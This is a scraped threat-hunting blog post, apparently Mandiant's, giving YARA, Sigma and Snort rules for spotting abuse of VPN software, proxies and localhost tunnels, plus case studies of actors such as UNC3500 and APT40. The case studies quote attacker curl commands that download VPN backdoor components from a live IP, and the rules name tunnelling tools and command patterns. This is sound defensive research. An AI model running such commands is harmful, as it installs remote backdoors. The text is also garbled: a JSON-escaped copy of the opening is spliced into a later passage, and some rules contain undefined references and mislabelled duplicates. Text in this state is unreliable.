        $anchorre1 = /\&quot;default_title\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre2 = /\&quot;description\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre3 = /\&quot;name\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre4 = /\&quot;short_name\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre5 = /\&quot;default_title\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre6 = /\&quot;description\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre7 = /\&quot;name\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre8 = /\&quot;short_name\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii
    condition:
        filesize &lt; 1MB and $manifest1 and $manifest2 and $manifest3 and (2 of ($optional*)) and (1 of ($anchorre*))
}</code></pre>
<p><strong>Chrome Extension Equities in a Binary</strong></p>
<p> </p>
<pre><code>rule M_Hunting_VPNEngine_ChromeExtensionInBinary_1
{
    meta:
        author = &quot;Mandiant&quot;
        md5 = &quot;2e09a136e40143ed3317c9ce6ea027a6&quot;
    strings:
        $manifest1 = &quot;\&quot;manifest_version\&quot;:&quot; ascii nocase
        $manifest2 = &quot;\&quot;name\&quot;:&quot; ascii nocase
        $manifest3 = &quot;\&quot;version\&quot;:&quot; ascii nocase
        $optional1 = &quot;\&quot;author\&quot;:&quot; ascii nocase
        $optional2 = &quot;\&quot;browser_action\&quot;:&quot; ascii nocase
        $optional3 = &quot;\&quot;content_security_policy\&quot;:&quot; ascii nocase
        $optional4 = &quot;\&quot;default_icon\&quot;:&quot; ascii nocase
        $optional5 = &quot;\&quot;default_locale\&quot;:&quot; ascii nocase
        $optional6 = &quot;\&quot;default_title\&quot;:&quot; ascii nocase
        $optional7 = &quot;\&quot;description\&quot;:&quot; ascii nocase
        $optional8 = &quot;\&quot;differential_fingerprint\&quot;:&quot; ascii nocase
        $optional9 = &quot;\&quot;icons\&quot;:&quot; ascii nocase
        $optional10 = &quot;\&quot;permissions\&quot;:&quot; ascii nocase
        $optional11 = &quot;\&quot;background\&quot;:&quot; ascii nocase
        $anchorre1 = /\&quot;default_title\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre2 = /\&quot;description\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre3 = /\&quot;name\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre4 = /\&quot;short_name\&quot;: \&quot;[^\&quot;]{0,100}[pP]roxy[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre5 = /\&quot;default_title\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre6 = /\&quot;description\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre7 = /\&quot;name\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii 
        $anchorre8 = /\&quot;short_name\&quot;: \&quot;[^\&quot;]{0,100}(VPN|\s+vpn|vpn\s+)[^\&quot;]{0,100}\&quot;/ ascii
    condition:
        ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and $manifest1 and $manifest2 and $manifest3 and (2 of ($optional*))  and (1 of ($anchorre*))
}</code></pre>
<p><strong>LocalHost Tunnel Directions</strong></p>
<p><strong>Use of Legitimate Processes</strong></p>
<p><u>Concern</u>: Many LocalHost Tunnel processes utilize either legitimate processes (SSH) or custom non-malicious binaries (ngrok, lt) to implement the tunnel. This hinders detection of abuse because detection leans towards methodology and not binary identification.</p>
<p><u>Direction</u>: LocalHost Tunnels typically use unique and moderately identifiable structure of process commandlines, this allows for to detection opportunities.</p>
<p><strong>LocalHost Tunnel Commandlines</strong></p>
<p>Localhost Tunnel Host Commands (METHODOLOGY)</p>
<p> </p>
<pre><code>title: 'Localhost Tunnel Host Commands (METHODOLOGY)'
description: 'Detect potential localhost tunnel commandlines.'
author: Mandiant
date: '2022-06-15'
status: hunting
logsource:
    product: 'FireEye HX'
detection:
    selectionKnownCMDs:
        processEvent processCmdLine|re:
            - 'ngrok\s+(http|tcp|tls|start)\s+'
            - 'lt\s+--port\s+[0-9]{1,5}'
            - 'gotunnelme\s+[0-9]{1,5}'
    selectionNgrokProcess:
        processEvent processCmdLine|contains: "ngrok"
    selectionNgrokCMD:
        processEvent processCmdLine|contains:
            - 'http '
            - 'tls '
            - 'tcp '
            - 'start '
    selectionLHRun1:
        processEvent processCmdLine|contains: "ssh"
    selectionLHRun2:
        processEvent processCmdLine|contains: "-R"
    selectionLocalTunnel1:
        processEvent processCmdLine|contains: "localtunnel"
    selectionLocalTunnel2:
        processEvent processCmdLine|contains: "--port"  
    selectionLocalTunnel3:
        processEvent processCmdLine|contains:
            - "/lt"
            - "\lt"
            - " lt"
    selectionLocalTunnel4:
        processEvent processCmdLine|contains:
            - " http"
            - " https"
    selectionLocalTunnel5:
        processEvent processCmdLine|contains:
            - "-s"
            - "--server"
            - "-h"
            - "--host"
            - "-p"
            - "--port"                
    condition: selectionKnownCMDs or (selectionNgrokProcess and selectionNgrokCMD) or (selectionLHRun1 and selectionLHRun2 and selectionLHRun3) or ((selectionLocalTunnel1 or selectionLocalTunnel3) and selectionLocalTunnel2) or (selectionLocalTunnel1 and selectionLocalTunnel4 and selectionLocalTunnel5)
fields:
    - "processEvent processCmdLine"
    - "processEvent Process"
    - "processEvent Username"
    - "processEvent Md5"
falsepositives:
    - "Unknown"
level: "medium"</code></pre>
<p><strong>Ngrok Agent IPs in Network Traffic</strong></p>
<p>Historically, Ngrok’s tunneling protects origin servers by hiding the origin IPs. However, the origin IPs for all free endpoints are <a href="https://ngrok.com/abuse" rel="noopener" target="_blank">exposed in the ngrok-agent-ips header </a>on all HTTP responses returned by the tunnel endpoint. This can easily be hunted for and detected via Snort to better label and understand network session data.</p>
<p> </p>
<pre><code>alert tcp any any -&gt; any any ( msg:&quot;M.Tunneler.HTTP.Ngrok.[response]&quot;; content:&quot;HTTP/1&quot;; depth:6; content:&quot;200 OK&quot;; within:9; content:&quot;|0d0a|ngrok-agent-ips:&quot;; threshold:type limit,track by_src,count 1,seconds 1800; sid:1; rev:1; )</code></pre>
<p><strong>Other Generic Directions</strong></p>
<p><strong>Files that contain common VPN equities</strong></p>
<p><u>Concern</u>: Adversaries may use modified binaries to interact with VPN infrastructure. This more general direction allows for a comprehensive look into potential VPN-like behavior.</p>
<div>
<p><u>Direction</u>: Identify core binary components that are not so easily modified to match on (i.e. PDB paths, exports, third-party libraries, domains, etc)</p>
<p><strong>Generic Domains in Binaries</strong></p>
<p> </p>
<pre><code>rule M_Hunting_VPNEngine_GenericProxyVPNDomain_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for generic proxy/vpn domains.&quot;
        md5 = &quot;96842ad6cc00fab5776171c56812b9a5&quot;
    strings:
        $UniqueProxyVPNDomain = /(proxy|vpn)\.[^\.]{1,100}\.(net|com|org)/ ascii fullword nocase
    condition:
        filesize &lt; 5MB and ((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and $UniqueProxyVPNDomain
}</code></pre>
<p><strong>ConventionEngine</strong></p>
<p>As documented in the <a href="https://cloud.google.com/blog/topics/threat-intelligence/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware" rel="noopener" target="_blank">Definitive Dossier of Devilish Debug Details: Part One</a>:</p>
<p>“Often users name folders and files based on their content. Computers force users to label and annotate their data based on the data type, role, and purpose. This human-computer <strong>convention</strong> means that most digital content has some descriptive surface area, or descriptive “features” that are present in many files, including malware files…. Not all these features were meant to be in [a binary], and they were certainly not intended for defenders to notice. This is especially true for PDB paths, which can be described as an outcome of the compilation process, a toolmark left in malware that describes the development environment.”</p>
<p><strong>VPN or Proxy PDB Convention</strong></p>
<p> </p>
<pre><code>rule M_Hunting_Win_VPNEngine_PDB_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for VPN or Proxy PDB.&quot;
        md5 = &quot;2bf422e19e721b461f9e98271fb28ad3&quot;
    strings:
        $pdb = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,500}(vpn|proxy)[\x00-\xFF]{0,500}\.pdb\x00/ ascii nocase wide
    condition:
        filesize &lt; 5MB and uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pdb
}</code></pre>
<p><strong>Hunting 3rd Party Libraries</strong></p>
<p>While some products are more popular than others, there are countless VPN software companies and products. Therefore, relying on specific brand detections is not suitable for purposes of wide detections. Hence, <strong>detection on popular third-party libraries </strong>that these software use at scale would allow a broader and more inclusive scope. Some of these third-party tunnel libraries include gotunnelme, golocaltunnel, localtunnel.net, and zdtun.</p>
<p><strong>GoTunnelMe Library</strong></p>
<p> </p>
<pre><code>rule M_Hunting_AscensionEngine_gotunnelme_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for binaries that use gotunnelme.&quot;
        md5 = &quot;35fcc4b19946d1bc9c21add1f42d2b63&quot;
    strings:
        $anchor = &quot;gotunnelme&quot; ascii nocase wide
        $func1 = &quot;NewTunnelConn&quot; ascii nocase wide
        $func2 = &quot;Tunnel&quot; ascii nocase wide
        $func3 = &quot;StopTunnel&quot; ascii nocase wide
               $func4 = &quot;ConnectRemote&quot; ascii nocase wide           
               $func5 = &quot;NewTunnel&quot; ascii nocase wide
               $func6 = &quot;GetUrl&quot; ascii nocase wide
    condition:
         ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and $anchor and (1 of ($func*))
}</code></pre>
<p><strong>GoLocalTunnel Library</strong></p>
<p> </p>
<pre><code>rule M_Hunting_AscensionEngine_golocaltunnel_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for binaries that use golocaltunnel.&quot;
        md5 = &quot;35fcc4b19946d1bc9c21add1f42d2b63&quot;
    strings:
        $anchor1 = &quot;localtunnel.go&quot; ascii nocase wide
               $func1 = &quot;readAtmost&quot; ascii nocase wide
               $func2 = &quot;Network&quot; ascii nocase wide
               $func3 = &quot;WaitFor&quot; ascii nocase wide
               $func4 = &quot;Accept&quot; ascii nocase wide
               $func5 = &quot;Addr&quot; ascii nocase wide
               $func6 = &quot;URL&quot; ascii nocase wide
               $func7 = &quot;ReachedEOF&quot; ascii nocase wide
               $func8 = &quot;setDefaults&quot; ascii nocase wide
    condition:
         ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and $anchor1 and (3 of ($func*))
}</code></pre>
<p><strong>LocalTunnelNet Library</strong></p>
<p> </p>
<pre><code>rule M_Hunting_AscensionEngine_localtunnelnet_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for binaries that use localtunnel.net.&quot;
        md5 = &quot;35fcc4b19946d1bc9c21add1f42d2b63&quot;
    strings:
               $s1 = &quot;Localtunnel&quot; ascii nocase wide
               $s2 = &quot;LocaltunnelClient&quot; ascii nocase wide
               $s3 = &quot;ProxiedSslTunnelOptions&quot; ascii nocase wide
               $s4 = &quot;ProxiedSslTunnelConnection&quot; ascii nocase wide
    condition:
         ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and all of them
}</code></pre>
<p><strong>ZDTun Library</strong></p>
<p> </p>
<pre><code>rule M_Hunting_AscensionEngine_zdtun_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for binaries that use zdtun.&quot;
        md5 = &quot;f224e0c1ad6d27c76b1f87fdb8ada639&quot;
    strings:
               $anchor = &quot;zdtun&quot; ascii nocase wide
               $s1 = &quot;zdtun_conn_close&quot; ascii nocase wide
               $s2 = &quot;zdtun_conn_dnat&quot; ascii nocase wide
               $s3 = &quot;zdtun_conn_proxy&quot; ascii nocase wide
               $s4 = &quot;zdtun_conn_set_userdata&quot; ascii nocase wide
               $s5 = &quot;zdtun_fds&quot; ascii nocase wide
               $s6 = &quot;zdtun_finalize&quot; ascii nocase wide
               $s7 = &quot;zdtun_get_stats&quot; ascii nocase wide
               $s8 = &quot;zdtun_make_iphdr&quot; ascii nocase wide
               $s9 = &quot;zdtun_purge_expired&quot; ascii nocase wide
               $s10 = &quot;zdtun_set_dnat_info&quot; ascii nocase wide
               $s11 = &quot;zdtun_set_mtu&quot; ascii nocase wide
               $s12 = &quot;zdtun_set_socks5_proxy&quot; ascii nocase wide
               $s13 = &quot;zdtun_conn_get_userdata&quot; ascii nocase wide
               $s14 = &quot;zdtun_userdata&quot; ascii nocase wide
               $s15 = &quot;zdtun_init&quot; ascii nocase wide
    condition:
         ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and $anchor and (5 of ($s*))
}</code></pre>
<p><strong>Generic Proxy, Tunnel, or VPN Library via Github</strong></p>
<p> </p>
<pre><code>rule M_Hunting_AscensionEngine_GithubVPNProxy_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Rule looks for binaries that include vpn/proxy/tunnel github links&quot;
    strings:
        $r1 = /github.com\/[^\/]+\/[^\/]*(vpn|VPN|proxy|Proxy|tunnel|Tunnel)[^\/]*\//
        $vpn = &quot;vpn&quot; nocase fullword
        $proxy = &quot;proxy&quot; nocase fullword
        $tunnel = &quot;tunnel&quot; nocase fullword
    condition:
         ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize &lt; 20MB and $r1 and ($vpn or $proxy or $tunnel)
}</code></pre>
<h3><strong>Binary Export Artifacts</strong></h3>
<p>Based on <a href="https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll?view=msvc-170" rel="noopener" target="_blank">Microsoft documentation</a>, DLL files contain an exports table. The exports table includes the name of every function that the DLL exports to other executables. These functions are the entry points into the DLL; only the functions in the exports table can be accessed by other executables.</p>
<p>These export equities within files may help identify <em>intent</em>, especially as it pertains to unique exports and the goal with their use. There are other unique portable executable details that allow for insight into possible intent, including resource names and domain presence.</p>
<p>VPN Specific DLL Exports</p>
<p> </p>
<pre><code>import &quot;pe&quot;
rule M_Hunting_Win_ExportEngine_vpn_dll_1
{
        meta:
        author = &quot;Mandiant&quot;
        description = &quot;Looks for an export dll containing the string vpn&quot;
        reference = &quot;https://twitter.com/stvemillertime/status/1241027937970814976?s=20&amp;t=t2Esf89F6T8LuiBsT8RV-g&quot;
        md5 = &quot;61d59eb2799b1a77eedf34b145cf23e1&quot;
        strings:
               $pcre = /[\x00-\x7F]{0,100}(vpn|VPN)[\x00-\x7F]{0,100}\.(dat|dll|sys|exe)\x00/
        condition:
               uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))
}</code></pre>
<p>Proxy Specific DLL Exports</p>
<p> </p>
<pre><code>import &quot;pe&quot;
rule M_Hunting_Win_ExportEngine_vpn_dll_1
{
        meta:
        author = &quot;Mandiant&quot;
        description = &quot;Looks for an export dll containing the string vpn&quot;
        reference = &quot;https://twitter.com/stvemillertime/status/1241027937970814976?s=20&amp;t=t2Esf89F6T8LuiBsT8RV-g&quot;
        md5 = &quot;61d59eb2799b1a77eedf34b145cf23e1&quot;
        strings:
               $pcre = /[\x00-\x7F]{0,100}(proxy|Proxy|PROXY)[\x00-\x7F]{0,100}\.(dat|dll|sys|exe)\x00/
        condition:
               uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))
}</code></pre>
<p>VPN or Proxy Specific PE Resource Names</p>
<p> </p>
<pre><code>import "pe"
rule M_Hunting_Win_VPNEngine_ResourceInPE_1
{
    meta:
        author = "Mandiant"
        description = "This signature is looking for VPN or Proxy subresources."
        md5 = "2ce7a0ffa14134167945e8df84755f1c"
    condition:
        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and for any i in (0.. pe.number_of_resources - 1): ( pe.resources[i].name_string == "V\x00P\x00N\x00" or pe.resources[i].name_string == "P\x00R\x00O\x00X\x00Y\x00" or pe.resources[i].name_string == "VPN" or pe.resources[i].name_string == "PROXY")</code></pre>
<h2>Impact - A Case Study</h2>
<p>As analysts, researchers, engineers, etc. - time is limited. Time is one of the greatest resources that anyone has. So, it’s important to ask the question: <em>Why care?</em> Well, the following sections will highlight a variety of adversaries abusing the techniques and technologies discussed in this blog.</p>
<h3><strong>UNC3500</strong></h3>
<p>UNC3500 is a suspected Chinese actor that has leveraged CVE-2021-44228 to target entities in the education and telecommunications sectors. The group has established persistence by <strong>creating a VPN and HTTPS server that can function as a backdoor</strong> following initial compromise.</p>
<p>Following reconnaissance and initial actions in a specific UNC3500 intrusion the attackers proceeded to download the aforementioned VPN software and HTTPS server using the following commands:</p>
<ul>
<li>curl hxxp://35.189.145[.]119/hamcore.se2 &gt; /mi/pki/mics/log/hamcore.se2
<ul>
<li>(MD5: 9fb1191ba0064d317a883677ce568023)</li>
</ul>
</li>
<li>curl hxxp://35.189.145[.]119/https &gt; /mi/pki/mics/log/https
<ul>
<li>(MD5: 00352d167c44272dba415c36867a8125)</li>
</ul>
</li>
<li>curl hxxp://35.189.145[.]119/vpn_bridge.config &gt; /mi/pki/mics/log/vpn_bridge.config 
<ul>
<li>(MD5: ce5d96252315e2c9d5fd9aeb98ae28ae)</li>
</ul>
</li>
</ul>
<p>The https and hamcore.se2 files are components of SoftEther’s VPN server bridge, PacketiX. The PacketiX VPN Bridge creates a layer 2 connection between a physical network adapter on a local system and a remote SoftEther VPN server. It requires an accompanying library file hamcore.se2 and a configuration file vpn_bridge.config. By deploying this package, UNC3500 established persistence on the compromised server.</p>
<h3><strong>APT40</strong></h3>
<p>APT40 primarily carries out intrusion activities against maritime industries and has been linked to activity dating back to at least 2013. In April 2021, four members of APT40 were <a href="https://www.justice.gov/opa/pr/four-chinese-nationals-working-ministry-state-security-charged-global-computer-intrusion" rel="noreferrer noopener" target="_blank">indicted</a> by the U.S. Department of Justice, alleged to be working on behalf of the MSS in Hainan. Operations may target sensitive data that would benefit research and development programs, inform decision makers sponsoring these actors, and enable further targeting of related organizations. </p>
<p>One methodology observed being used by APT40 includes <strong>exfiltration via VPN</strong>. Additionally, APT40 has been <strong>identified utilizing ProtonVPN and ExpressVPN</strong>.</p>
<h3><strong>UNC2465</strong></h3>
<p>In a Supply Chain intrusion, SMOKEDHAM, a lightweight .NET-based backdoor used by UNC2465, used PowerShell to connect to third-party file sharing sites to<strong> download an Ngrok utility that was renamed conhost.exe.</strong> A script was used to execute <strong>Ngrok with a configuration file named ngrok.yml.</strong> Ngrok is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.</p>
<p>UNC2465 is a threat cluster that has previously deployed DARKSIDE ransomware and is suspected to have been active since at least March 2020. UNC2465 activity is characterized by their ongoing use of similar tactics, techniques, and procedures (TTPs) to distribute the publicly available PowerShell-based SMOKEDHAM backdoor in victim environments. UNC2465 has extorted using a hybrid approach of DARKSIDE ransomware and extortion through a leaks website over TOR. DARKSIDE applies pressure initially through shaming a victim with a small amount of data published on a the DARKSIDE blog followed by larger releases of data lasting several days if a client won't pay. This group likely represents an affiliate, only a smaller part of overall DARKSIDE ecosystem. UNC2465 has used phishing, web compromises, and supply chain access through the trojanization of legitimate software installers. UNC2465 activities have continued past the overall shutdown of DARKSIDE RaaS.</p>
<p><strong>Underground Forums</strong></p>
<p>An English-speaking actor named 'idk' advertised access to U.S. Insurance and Healthcare companies in which the method of access listed was “OpenVPN installed” and “credentials from OpenVPN”.</p>
<p><strong>VPNs as Sources</strong></p>
<p><strong>UNC3661 </strong>has used <u>NordVPN</u> to hide origin IPs for their remote interactions with victim environments.</p>
<p>A <strong>NEARTWIST </strong>cluster of activity used against Ukraine (linked to <strong>APT28 </strong>with moderate confidence) logged in to web shells using <u>ExpressVPN</u> IP addresses.</p>
<h3><strong>Prevalence</strong></h3>
<p>A Jedi Master <a href="https://twitter.com/stvemillertime/status/1452650807103533060" rel="noopener" target="_blank">once said</a>, “Prevalence is the number one thing analysts want”. So let's talk prevalence! Utilizing the various detections and methods highlighted in this blog against housed Mandiant data, 40+ connections were made to different adversary groups and malware families.</p>
<p> </p>

<div>
<div>
<div>
<div>
<div>
<div>
<div>
<div>
<h2>Where Did We Go?</h2>
<p>The use of VPN software, proxy services, and localhost tunnels provide adversaries an air of legitimacy, detection bypass via encryption, and potential point to point access. These characteristics are high value desires of an adversary, and make detection, containment, and eradication more burdensome on the blue team.</p>
<p>However, in this blog VPN software, proxy services, and localhost tunnels were analyzed for hunting directions. These hunting directions did include vendor and service specific items (SoftEther, Ngrok, WireGuard, OpenVPN, Hide.Me, etc.), but also focused on wholistic and tradecraft-related directions (Conventions, 3rd Party Libraries, PE Artifacts, etc.).</p>
<p>These directions will expand the defender’s hunting and detection repertoire against these software and service suites, lowing the burden on the blue team.</p>
<p><strong>Happy Hunting</strong></p>
<p><strong>Acknowledgements</strong></p>
<p>Thanks to everyone that contributed analysis and review. Special thanks to Matthew Dunwoody and Evan Reese.</p>
<p><strong>Disclaimer</strong></p>
<p>The signatures documented in this blog are meant to be threat hunting directions and jump-points – empowering the analyst to take the next step down the rabbit hole and identify suspicious activity. Every network is different and because of that, these signatures should not be deployed in production environments without testing and, when required, tuning.</p>
<p>Case studies and examples are drawn from our experiences and activities working for a variety of customers, and do not represent our work for any one customer or set of customers. In many cases, facts have been changed to obscure the identity of our customers and individuals associated with our customers.</p>

type\u003d\"application/ld+json\"\u003e{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"@id\":\"https://cloud.google.com/blog/topics/threat-intelligence/burrowing-your-way-into-vpns\",\"headline\":\"Burrowing Intelligence\",\"Security \\u0026 Identity\"],\"timeRequired\":\"PT22M\"}\u003c/script\u003e"],["Burrowing your way into VPNs, Proxies, and Tunnels"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Jared Wilson\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003ch2\u003eWhy Are We Here?\u003c/h2\u003e\n\u003cp\u003eWhen considering an attack lifecycle from an adversarial perspective, the adversary has a few options on how to proceed at each step. One of questions that needs to be answered is whether the adversary will use publicly known malware (i.e. BEACON), custom built-from-the-ground-up malware (i.e. HAMMERTOSS), or legitimate software and services (i.e. \u003ca href\u003d\"https://www.softether.org/\" rel\u003d\"noreferrer noopener\" target\u003d\"_blank\"\u003eSoftEther Virtual Private Network\u003c/a\u003e) that provide the necessary functionality to complete said step.\u003c/p\u003e\n\u003cp\u003eEach option has upsides and downsides: Publicly known malware can be extremely cheap but also can be easy to detect since it has been in the public eye for some time. Custom malware can be extremely stealthy given its unique code-base but also very expensive in time and/or money given it needs to be developed prior to use. Legitimate software and services can also be stealthy due to their camouflage effect into “normal network activity” but also may not provide precisely the type of functionality desired, since it was not written to be used for the function it is being considered for.\u003c/p\u003e\n\u003cp\u003eMandiant has observed all three of these theoretical “options” throughout research and engagements from formidable adversaries, making each method valuable for hunting, collections, and analysis.\u003c/p\u003e\n\u003cp\u003eHowever, the purpose of the content you are about to read is to discuss the third and, at some lunch tables, the least discussed option: legitimate Virtual Private Network (VPN) software, proxy services, and localhost tunnels. This content will walk through each of these three remote access methods to further expand the defender’s hunting and detection repertoire against VPN software, proxy services, and tunnels.\u003c/p\u003e\n\u003ch2\u003eDefining Differences\u003c/h2\u003e\n\u003ch3\u003e\u003cstrong\u003eVirtual Private Network Software\u003c/strong\u003e\u003c/h3\u003e\n\u003cdiv\u003e\n\u003cp\u003eTo understand VPN software, one must understand a VPN: A virtual private network is an encrypted connection over the Internet from a device to a network. The encrypted connection helps ensure that sensitive data is safely transmitted. It prevents unauthorized people from eavesdropping on the traffic and allows the user to conduct work \u003ca href\u003d\"https://www.checkpoint.com/cyber-hub/network-security/what-is-vpn/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eremotely\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eIn the following, \u003cstrong\u003eVPN software \u003c/strong\u003ewill be defined as any software artifacts which facilitate the use of a VPN connection (SoftEther VPN Client, OpenVPN Client, etc).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eProxy Services\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eIn computer science a proxy is a server which resides between the client making a request and the requested destination server. Proxies can be used for multiple purposes including network log collection, cache repository, and providing anonymized internet access. A \u003cstrong\u003eproxy service\u003c/strong\u003e is an online resource that allows a user to get the benefits of a proxy with none of the infrastructure concerns (RSocks, HideMyAss, Hide.Me, etc).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLocalHost Tunneling\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eBoth VPN software and proxy services facilitate the outbound connection from client to server, while localhost tunneling is similar, it facilitates the connection from the external network back to the client. This is done by what is commonly called “exposing localhost” (Ngrok, LocalTunnel, Localhost.Run, etc).\u003c/p\u003e\n\u003ch2\u003eDetect from all Directions\u003c/h2\u003e\n\u003cp\u003eBrainstorming over the different hunt and detection directions led to the following conclusion: Detection of legitimate software and services at this scale cannot be a narrow implementation of a single detection discipline, but rather, expand across multiple disciplines.\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eBrainstorming Hunting \u0026amp; Detection Directions\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eInitiating a large-scale hunting and detection operation like this requires brainstorming through the, hopefully many, different hunting and detection options available to each organization. For example: should the organization have no ability to run snort signatures against network traffic then that type of direction can take the backseat to other primary detection methods.\u003c/p\u003e\n\u003cp\u003eAdditionally, when hunting for a technology being utilized as a methodology it is easy to fall into a “whac-a-vendor” type approach focusing on each vendor’s version of the technology (i.e. Detection on SoftEther, NordVPN, Ngrok, etc). This is not a terrible approach, as it has its merits, but is not ideal. In the following sections there will be detections highlighted covering SoftEther VPN, Ngrok, and others. These are covered due to the threat dense nature of their use.The ideal hunting process would use more methodology driven detection, being more vendor agnostic, as highlighted in the following Hunting Direction sections.\u003c/p\u003e\n\u003ch2\u003eVPN Client Directions\u003c/h2\u003e\n\u003ch3\u003e\u003cstrong\u003eFiles that are wrapped around suspected VPN files\u003c/strong\u003e\u003c/h3\u003e\n\u003cdiv\u003e\n\u003cp\u003e\u003cu\u003eConcern\u003c/u\u003e: Adversaries may use innocuous files that house these VPN files inside of themselves to masquerade as something other than a remote access software.\u003c/p\u003e\n\u003cp\u003e\u003cu\u003eDirection\u003c/u\u003e: Use detection logic that can peer into the construct of the file itself to identify the VPN artifacts layered below the innocuous files.\u003c/p\u003e\n\u003cp\u003eThe following can be considered hunting detections and directions for a variety of files wrapped around VPN equities and/or VPN files.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRich Text Format files with Embedded Hex Payloads\u003c/li\u003e\n\u003cli\u003eOpen Office XML files with Embedded VPN Target Domains\u003c/li\u003e\n\u003cli\u003eOptical Disc Image (ISO Image) files with VPN File or Domain References\u003c/li\u003e\n\u003cli\u003eMach Object (Mach-O) file with VPN File or Domain References\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e\u003cstrong\u003eRTF Embedded Hex Payload with Hex VPN File However, the origin IPs for all free endpoints are \u003ca href\u003d\"https://ngrok.com/abuse\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eexposed in the ngrok-agent-ips header \u003c/a\u003eon all HTTP responses returned by the tunnel endpoint. This can easily be hunted for and detected via Snort to better label and understand network session data.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ealert tcp any any -\u0026gt; any any ( msg:\u0026quot;M.Tunneler.HTTP.Ngrok.[response]\u0026quot;; content:\u0026quot;HTTP/1\u0026quot;; depth:6; content:\u0026quot;200 OK\u0026quot;; within:9; content:\u0026quot;|0d0a|ngrok-agent-ips:\u0026quot;; threshold:type limit,track by_src,count 1,seconds 1800; sid:1; rev:1; )\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eOther Generic Directions\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eFiles that contain common VPN equities\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cu\u003eConcern\u003c/u\u003e: Adversaries may use modified binaries to interact with VPN infrastructure. This more general direction allows for a comprehensive look into potential VPN-like 